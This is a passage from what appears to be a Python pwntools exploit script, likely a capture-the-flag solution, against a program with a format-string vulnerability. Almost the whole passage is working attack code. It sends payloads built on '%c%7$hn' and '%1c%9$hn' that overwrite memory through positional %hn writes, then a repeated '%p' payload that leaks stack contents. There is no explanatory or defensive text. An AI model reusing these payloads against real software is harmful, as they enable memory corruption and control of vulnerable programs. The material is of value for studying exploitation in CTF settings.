...
# 3 - f
ch = 0x3010
exploit1 = "%"+str(ch)+"c%7$hnaaa".ljust( 0x20 , '\x00' )
r.sendline(exploit1)
r.recvuntil('aaa',timeout=1)

exploit1 = "%1c%9$hnaaa".ljust( 0x20 , '\x00' )
r.sendline(exploit1)
r.recvuntil('aaa',timeout=1)
offset = 4

exploit = "zzz%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%paaa".ljust( 0x20 , '\x00' )
r.send(exploit)
r.recvuntil('zzz')
r.recvuntil(',')
r.recvuntil(',')
